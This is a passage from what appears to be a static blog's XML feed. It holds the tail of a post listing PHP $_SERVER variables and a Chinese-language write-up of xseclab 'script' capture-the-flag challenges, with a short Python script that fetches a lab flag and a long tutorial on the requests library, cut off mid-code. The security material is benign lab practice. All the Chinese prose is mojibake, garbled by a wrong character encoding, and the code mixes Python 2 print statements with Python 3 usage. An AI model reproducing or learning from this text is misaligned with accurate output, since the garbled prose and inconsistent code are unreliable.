è¾“å‡ºé…ç½®æ–‡ä»¶httpd.confä¸­çš„ServerNameï¼Œä¸€èˆ¬æƒ…å†µä¸‹ä¸HTTP_HOSTå€¼ç›¸åŒï¼Œä½†å¦‚æœæœåŠ¡å™¨ç«¯å£ä¸æ˜¯é»˜è®¤çš„80ç«¯å£ï¼Œæˆ–è€…åè®®è§„èŒƒä¸æ˜¯HTTP/1.1æ—¶ï¼ŒHTTP_HOSTä¼šåŒ…å«è¿™äº›ä¿¡æ¯ï¼Œè€ŒSERVER_NAMEä¸ä¸€å®šåŒ…å«ã€‚ï¼ˆä¸»è¦çœ‹é…ç½®æ–‡ä»¶çš„è®¾ç½®ï¼‰ã€‚</li><li>$_SERVER[â€œHTTP_USER_AGENTâ€] è·å–ç”¨æˆ·ç›¸å…³ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç”¨æˆ·æµè§ˆå™¨ã€æ“ä½œç³»ç»Ÿç­‰ä¿¡æ¯ã€‚</li><li>$_SERVER[â€˜HTTP_ACCEPTâ€™] å½“å‰è¯·æ±‚çš„ACCEPTå¤´éƒ¨ä¿¡æ¯ã€‚</li><li>$_SERVER[â€œHTTP_ACCEPT_LANGUAGEâ€] è¿™ä¸ªå€¼æ˜¯ç”±æµè§ˆå™¨å‘é€ï¼Œè¡¨æ˜ç”¨æˆ·é»˜è®¤çš„è¯­è¨€è®¾ç½®ï¼Œåé¢çš„qå€¼è¡¨ç¤ºç”¨æˆ·å¯¹è¯¥è¯­è¨€çš„å–œå¥½ç¨‹åº¦ã€‚</li><li>$_SERVER[â€œHTTP_ACCEPT_ENCODINGâ€] å¤§éƒ¨åˆ†çš„ç°ä»£æµè§ˆå™¨éƒ½æ”¯æŒgzipå‹ç¼©ï¼Œå¹¶ä¼šæŠŠè¿™ä¸€ä¿¡æ¯æŠ¥å‘Šç»™æœåŠ¡å™¨ã€‚è¿™æ—¶æœåŠ¡å™¨å°±ä¼šå‹ç¼©è¿‡çš„HTMLå‘é€ç»™æµè§ˆå™¨ã€‚è¿™å¯ä»¥å‡å°‘è¿‘80%çš„æ–‡ä»¶å¤§å°ï¼Œä»¥èŠ‚çœä¸‹è½½æ—¶é—´å’Œå¸¦å®½ã€‚</li><li>$_SERVER[â€œHTTP_COOKIEâ€] æµè§ˆå™¨çš„cookieä¿¡æ¯ã€‚</li><li>$_SERVER[â€œHTTP_CONNECTIONâ€] å½“å‰è¯·æ±‚çš„è¿æ¥æƒ…å†µã€‚</li><li>$_SERVER[â€œHTTP_UPGRADE_INSECURE_REQUESTSâ€] è¡¨ç¤ºæµè§ˆå™¨å¯è¯»æ‡‚æœåŠ¡å™¨å‘è¿‡æ¥çš„è¯·æ±‚ï¼Œ</li><li>$_SERVER[â€œHTTP_CACHE_CONTROLâ€] è¡¨ç¤ºæµè§ˆå™¨æ˜¯å¦ä¼šç¼“å­˜è¿™ä¸ªé¡µé¢ä¿¡æ¯ã€‚</li><li>$_SERVER[â€œPATHâ€] å½“å‰è„šæœ¬æ‰€åœ¨æ–‡ä»¶ç³»ç»Ÿã€‚</li><li>$_SERVER[â€œSystemRootâ€] å½“å‰æœåŠ¡å™¨çš„æ“ä½œç³»ç»Ÿã€‚</li><li>$_SERVER[â€œCOMSPECâ€] æŒ‡å‘cmd.exeçš„è·¯å¾„ã€‚</li><li>$_SERVER[â€œPATHEXTâ€] ç¯å¢ƒå˜é‡è®¾ç½®ã€‚</li><li>$_SERVER[â€œWINDIRâ€] è„šæœ¬æŒ‡å‘çš„ç³»ç»Ÿç›®å½•ã€‚</li><li>$_SERVER[â€œSERVER_SIGNATUREâ€] åŒ…å«æœåŠ¡å™¨ç‰ˆæœ¬å’Œè™šæ‹Ÿä¸»æœºåçš„å­—ç¬¦ä¸²ã€‚</li><li>$_SERVER[â€œSERVER_SOFTWAREâ€] æœåŠ¡å™¨è½¯ä»¶é…ç½®ä¿¡æ¯ã€‚</li><li>$_SERVER[â€œSERVER_ADDRâ€] å½“å‰è¿è¡Œè„šæœ¬çš„æœåŠ¡å™¨çš„ipåœ°å€ã€‚</li><li>$_SERVER[â€œSERVER_PORTâ€] æœåŠ¡å™¨ç«¯å£ã€‚</li><li>$_SERVER[â€œREMOTE_ADDRâ€] æµè§ˆç½‘é¡µçš„ç”¨æˆ·ipã€‚</li><li>$_SERVER[â€œDOCUMENT_ROOTâ€] å½“å‰è¿è¡Œè„šæœ¬æ‰€åœ¨çš„æ ¹ç›®å½•ã€‚</li><li>$_SERVER[â€œREQUEST_SCHEMEâ€] æœåŠ¡å™¨é€šä¿¡åè®®ï¼Œæ˜¯httpæˆ–httpsã€‚</li><li>$_SERVER[â€œCONTEXT_PREFIXâ€] å‰ç¼€ã€‚</li><li>$_SERVER[â€œCONTEXT_DOCUMENT_ROOTâ€] å½“å‰è„šæœ¬æ‰€åœ¨çš„æ–‡æ¡£æ ¹ç›®å½•ã€‚</li><li>$_SERVER[â€œSERVER_ADMINâ€] æœåŠ¡å™¨ç®¡ç†å‘˜ä¿¡æ¯ã€‚</li><li>$_SERVER[â€œSCRIPT_FILENAMEâ€] å½“å‰æ‰§è¡Œè„šæœ¬çš„ç»å¯¹è·¯å¾„ã€‚</li><li>$_SERVER [â€œREMOTE_PORTâ€] ç”¨æˆ·è¿æ¥åˆ°æœåŠ¡å™¨æ—¶æ‰€ä½¿ç”¨çš„ç«¯å£ã€‚</li><li>$_SERVER[â€œGATEWAY_INTERFACEâ€] æœåŠ¡å™¨ä½¿ç”¨çš„CGIè§„èŒƒçš„ç‰ˆæœ¬ã€‚</li><li>$_SERVER[â€œSERVER_PROTOCOLâ€] è¯·æ±‚é¡µé¢æ—¶é€šä¿¡åè®®çš„åç§°å’Œç‰ˆæœ¬ã€‚</li><li>$_SERVER[â€œREQUEST_METHODâ€] è¯·æ±‚æäº¤æ•°æ®çš„æ–¹å¼ã€‚</li><li>$_SERVER[â€œQUERY_STRINGâ€] æœåŠ¡å™¨è¯·æ±‚æ—¶ï¼Ÿåé¢çš„å‚æ•°ã€‚</li><li>$_SERVER[â€œREQUEST_URIâ€] å½“å‰è„šæœ¬è·¯å¾„ï¼Œæ ¹ç›®å½•ä¹‹åçš„ç›®å½•ã€‚</li><li>$_SERVER[â€œSCRIPT_NAMEâ€] å½“å‰è„šæœ¬çš„è·¯å¾„ã€‚è¿™åœ¨é¡µé¢éœ€è¦æŒ‡å‘è‡ªå·±æ—¶éå¸¸æœ‰ç”¨ã€‚</li><li>$_SERVER[â€œPHP_SELFâ€] å½“å‰æ­£åœ¨æ‰§è¡Œè„šæœ¬çš„æ–‡ä»¶åã€‚</li><li>$_SERVER[â€œREQUEST_TIMEâ€] å¾—åˆ°è¯·æ±‚å¼€å§‹æ—¶çš„æ—¶é—´æˆ³ã€‚</li></ol>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> å‡½æ•° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç½‘ç»œå®‰å…¨lab</title>
      <link href="/2021/02/10/wang-luo-an-quan-lab/"/>
      <url>/2021/02/10/wang-luo-an-quan-lab/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="è„šæœ¬å…³"><a href="#è„šæœ¬å…³" class="headerlink" title="è„šæœ¬å…³"></a>è„šæœ¬å…³</h1><h2 id="keyåˆåˆæ‰¾ä¸åˆ°äº†"><a href="#keyåˆåˆæ‰¾ä¸åˆ°äº†" class="headerlink" title="keyåˆåˆæ‰¾ä¸åˆ°äº†"></a>keyåˆåˆæ‰¾ä¸åˆ°äº†</h2><p>åˆ†å€¼: 200</p><p>å°æ˜è¿™æ¬¡å“­äº†ï¼Œkeyåˆæ‰¾ä¸åˆ°äº†ï¼ï¼ï¼ keyå•Šï¼Œä½ ç©¶ç«Ÿè—åˆ°äº†å“ªé‡Œï¼Œä¸ºä»€ä¹ˆæˆ‘çœ‹åˆ°çš„é¡µé¢ä¸Šéƒ½æ²¡æœ‰å•Šï¼ï¼ï¼ï¼ï¼ï¼</p><p>å³é”®æŸ¥çœ‹æºä»£ç </p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>content-type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html;charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./search_key.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>_åˆ°è¿™é‡Œæ‰¾key__<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç¼–å†™è„šæœ¬ï¼š</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://lab1.xseclab.com/xss1_30ac8668cd453e7e387c76b132b140bb/search_key.php"</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™å°±å¥½åƒæ¨¡æ‹Ÿäº†æŠ“åŒ…çš„ä¸€ä¸ªè¿‡ç¨‹</p><p>å¾—åˆ°ï¼škey is : yougotit_script_now</p><h2 id="å¿«é€Ÿå£ç®—"><a href="#å¿«é€Ÿå£ç®—" class="headerlink" title="å¿«é€Ÿå£ç®—"></a>å¿«é€Ÿå£ç®—</h2><p>åˆ†å€¼: 350</p><p>å°æ˜è¦å‚åŠ ä¸€ä¸ªé«˜æŠ€èƒ½æ¯”èµ›ï¼Œè¦æ±‚æ¯ä¸ªäººéƒ½è¦èƒ½å¤Ÿå¿«é€Ÿå£ç®—å››åˆ™è¿ç®—ï¼Œ2ç§’é’Ÿä¹‹å†…å°±èƒ½å¤Ÿå¾—åˆ°ç»“æœï¼Œä½†æ˜¯å°æ˜å°±æ˜¯ä¸€ä¸ªå°å­¦ç”Ÿæ²¡æœ‰ç»è¿‡ç‰¹æ®Šçš„åŸ¹è®­ï¼Œé‚£å°æ˜èƒ½å¦é€šè¿‡å¿«é€Ÿå£ç®—æµ‹éªŒå‘¢ï¼Ÿ</p><p>æ¶è¡¥åŸºç¡€â†“ï¼š</p><h3 id="1-Requestsæ¨¡å—çš„ç®€å•ä½¿ç”¨"><a href="#1-Requestsæ¨¡å—çš„ç®€å•ä½¿ç”¨" class="headerlink" title="1.Requestsæ¨¡å—çš„ç®€å•ä½¿ç”¨"></a><strong>1.Requestsæ¨¡å—çš„ç®€å•ä½¿ç”¨</strong></h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#HTTPè¯·æ±‚ç±»å‹</span><span class="token comment" spellcheck="true">#æ— å‚æ•°çš„getç±»å‹</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://httpbin.org/get'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#æœ‰å‚çš„getç±»å‹</span>payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'key1'</span><span class="token punctuation">:</span><span class="token string">'vaule1'</span><span class="token punctuation">,</span><span class="token string">'key2'</span><span class="token punctuation">:</span><span class="token string">'value2'</span><span class="token punctuation">}</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#æ— å‚çš„postç±»å‹</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://httpbin.org/post"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#æœ‰å‚çš„postç±»å‹</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#dataä¸å…‰å¯ä»¥æ¥å—å­—å…¸ç±»å‹çš„æ•°æ®ï¼Œè¿˜å¯ä»¥æ¥å—jsonç­‰æ ¼å¼</span><span class="token keyword">import</span> jsonpayload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'a'</span><span class="token punctuation">:</span><span class="token string">'æ¨'</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">:</span><span class="token string">'hello'</span><span class="token punctuation">}</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://httpbin.org/post'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#å‘é€æ–‡ä»¶çš„postç±»å‹ï¼Œè¿™ä¸ªç›¸å½“äºå‘ç½‘ç«™ä¸Šä¼ ä¸€å¼ å›¾ç‰‡ï¼Œæ–‡æ¡£ç­‰æ“ä½œï¼Œè¿™æ—¶è¦ä½¿ç”¨fileså‚æ•°</span>files <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'file'</span><span class="token punctuation">:</span> open<span class="token punctuation">(</span><span class="token string">'touxiang.png'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">}</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://httpbin.org/post'</span><span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#putç±»å‹</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>put<span class="token punctuation">(</span><span class="token string">"http://m.ctrip.com/put"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#deleteç±»å‹</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>delete<span class="token punctuation">(</span><span class="token string">"http://m.ctrip.com/delete"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#headç±»å‹</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>head<span class="token punctuation">(</span><span class="token string">"http://m.ctrip.com/head"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#optionsç±»å‹</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>options<span class="token punctuation">(</span><span class="token string">"http://m.ctrip.com/get"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#è·å–å“åº”å†…å®¹</span><span class="token keyword">print</span> r<span class="token punctuation">.</span>content <span class="token comment" spellcheck="true">#ä»¥å­—èŠ‚çš„æ–¹å¼å»æ˜¾ç¤ºï¼Œä¸­æ–‡æ˜¾ç¤ºä¸ºå­—ç¬¦</span><span class="token keyword">print</span> r<span class="token punctuation">.</span>text <span class="token comment" spellcheck="true">#ä»¥æ–‡æœ¬çš„æ–¹å¼å»æ˜¾ç¤º</span><span class="token comment" spellcheck="true">#URLä¼ é€’å‚æ•°</span>payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'keyword'</span><span class="token punctuation">:</span> <span class="token string">'æ—¥æœ¬'</span><span class="token punctuation">,</span> <span class="token string">'salecityid'</span><span class="token punctuation">:</span> <span class="token string">'2'</span><span class="token punctuation">}</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://m.ctrip.com/webapp/tourvisa/visa_list"</span><span class="token punctuation">,</span> params<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token keyword">print</span> r<span class="token punctuation">.</span>url <span class="token comment" spellcheck="true">#ç¤ºä¾‹ä¸ºhttp://m.ctrip.com/webapp/tourvisa/visa_list?salecityid=2&amp;keyword=æ—¥æœ¬</span><span class="token comment" spellcheck="true">#è·å–/ä¿®æ”¹ç½‘é¡µç¼–ç </span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://github.com/timeline.json'</span><span class="token punctuation">)</span><span class="token keyword">print</span> r<span class="token punctuation">.</span>encodingr<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span><span class="token comment" spellcheck="true">#jsonå¤„ç†</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://github.com/timeline.json'</span><span class="token punctuation">)</span><span class="token keyword">print</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#éœ€è¦å…ˆimport json</span><span class="token comment" spellcheck="true">#å®šåˆ¶è¯·æ±‚å¤´</span>url <span class="token operator">=</span> <span class="token string">'http://m.ctrip.com'</span>headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'User-Agent'</span> <span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 4 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile Safari/535.19'</span><span class="token punctuation">}</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token keyword">print</span> r<span class="token punctuation">.</span>request<span class="token punctuation">.</span>headers<span class="token comment" spellcheck="true">#å¤æ‚postè¯·æ±‚</span>url <span class="token operator">=</span> <span class="token string">'http://m.ctrip.com'</span>payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'some'</span><span class="token punctuation">:</span> <span class="token string">'data'</span><span class="token punctuation">}</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#å¦‚æœä¼ é€’çš„payloadæ˜¯stringè€Œä¸æ˜¯dictï¼Œéœ€è¦å…ˆè°ƒç”¨dumpsæ–¹æ³•æ ¼å¼åŒ–ä¸€ä¸‹</span><span class="token comment" spellcheck="true">#postå¤šéƒ¨åˆ†ç¼–ç æ–‡ä»¶</span>url <span class="token operator">=</span> <span class="token string">'http://m.ctrip.com'</span>files <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'file'</span><span class="token punctuation">:</span> open<span class="token punctuation">(</span><span class="token string">'report.xls'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">}</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#å“åº”çŠ¶æ€ç </span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://m.ctrip.com'</span><span class="token punctuation">)</span><span class="token keyword">print</span> r<span class="token punctuation">.</span>status_code<span class="token comment" spellcheck="true">#å“åº”å¤´</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://m.ctrip.com'</span><span class="token punctuation">)</span><span class="token keyword">print</span> r<span class="token punctuation">.</span>headers<span class="token keyword">print</span> r<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span><span class="token keyword">print</span> r<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'content-type'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#è®¿é—®å“åº”å¤´éƒ¨åˆ†å†…å®¹çš„ä¸¤ç§æ–¹å¼</span><span class="token comment" spellcheck="true">#Cookies</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://www.baidu.com'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>cookies<span class="token punctuation">[</span><span class="token string">'BAIDUID'</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true">#è¯»å–cookies</span>url <span class="token operator">=</span> <span class="token string">'http://m.ctrip.com/cookies'</span>cookies <span class="token operator">=</span> dict<span class="token punctuation">(</span>cookies_are<span class="token operator">=</span><span class="token string">'working'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#å‘é€cookies</span><span class="token comment" spellcheck="true">#è®¾ç½®è¶…æ—¶æ—¶é—´</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://m.ctrip.com'</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.001</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#è®¿é—®ä¸­ä½¿ç”¨session</span>s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#å…ˆåˆå§‹åŒ–ä¸€ä¸ªsessionå¯¹è±¡</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data <span class="token operator">=</span> user<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#ç„¶åä½¿ç”¨è¿™ä¸ªsessionå¯¹è±¡æ¥è¿›è¡Œè®¿é—®ï¼Œå°†requestsä¸­çš„sessionç±»å®ä¾‹åŒ–ä¸ºä¸€ä¸ªå¯¹è±¡ã€‚ä»¥ä¾¿äºåœ¨è¯·æ±‚å¤´ä¸­è‡ªåŠ¨åŠ ä¸Šsession idã€‚</span><span class="token comment" spellcheck="true">#è®¾ç½®è®¿é—®ä»£ç†</span>proxies <span class="token operator">=</span> <span class="token punctuation">{</span>           <span class="token string">"http"</span><span class="token punctuation">:</span> <span class="token string">"http://10.10.10.10:8888"</span><span class="token punctuation">,</span>           <span class="token string">"https"</span><span class="token punctuation">:</span> <span class="token string">"http://10.10.10.100:4444"</span><span class="token punctuation">,</span>          <span class="token punctuation">}</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://m.ctrip.com'</span><span class="token punctuation">,</span> proxies<span class="token operator">=</span>proxies<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-jsonè¯·æ±‚"><a href="#2-jsonè¯·æ±‚" class="headerlink" title="2.jsonè¯·æ±‚"></a>2.jsonè¯·æ±‚</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/user/bin/env python</span><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> json<span class="token keyword">class</span> <span class="token class-name">url_request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token triple-quoted-string string">""" init """</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Content-Type'</span> <span class="token punctuation">:</span> <span class="token string">'application/json'</span><span class="token punctuation">}</span>    payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'CountryName'</span><span class="token punctuation">:</span><span class="token string">'ä¸­å›½'</span><span class="token punctuation">,</span>               <span class="token string">'ProvinceName'</span><span class="token punctuation">:</span><span class="token string">'é™•è¥¿çœ'</span><span class="token punctuation">,</span>               <span class="token string">'L1CityName'</span><span class="token punctuation">:</span><span class="token string">'æ±‰ä¸­'</span><span class="token punctuation">,</span>               <span class="token string">'L2CityName'</span><span class="token punctuation">:</span><span class="token string">'åŸå›º'</span><span class="token punctuation">,</span>               <span class="token string">'TownName'</span><span class="token punctuation">:</span><span class="token string">''</span><span class="token punctuation">,</span>               <span class="token string">'Longitude'</span><span class="token punctuation">:</span><span class="token string">'107.33393'</span><span class="token punctuation">,</span>               <span class="token string">'Latitude'</span><span class="token punctuation">:</span><span class="token string">'33.157131'</span><span class="token punctuation">,</span>               <span class="token string">'Language'</span><span class="token punctuation">:</span><span class="token string">'CN'</span>               <span class="token punctuation">}</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://www.xxxxxx.com/CityLocation/json/LBSLocateCity"</span><span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>data<span class="token operator">=</span>payload<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#r.encoding = 'utf-8'</span>    data<span class="token operator">=</span>r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code<span class="token operator">!=</span><span class="token number">200</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"LBSLocateCity API Error "</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>    <span class="token keyword">print</span> data<span class="token punctuation">[</span><span class="token string">'CityEntities'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'CityID'</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#æ‰“å°è¿”å›jsonä¸­çš„æŸä¸ªkeyçš„value</span>    <span class="token keyword">print</span> data<span class="token punctuation">[</span><span class="token string">'ResponseStatus'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'Ack'</span><span class="token punctuation">]</span>    <span class="token keyword">print</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">,</span>indent<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span>sort_keys<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>ensure_ascii<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#æ ‘å½¢æ‰“å°jsonï¼Œensure_asciiå¿…é¡»è®¾ä¸ºFalseå¦åˆ™ä¸­æ–‡ä¼šæ˜¾ç¤ºä¸ºunicode</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-xmlè¯·æ±‚"><a href="#3-xmlè¯·æ±‚" class="headerlink" title="3.xmlè¯·æ±‚"></a>3.xmlè¯·æ±‚</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/user/bin/env python</span><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">import</span> requests<span class="token keyword">class</span> <span class="token class-name">url_request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token triple-quoted-string string">""" init """</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Content-type'</span><span class="token punctuation">:</span> <span class="token 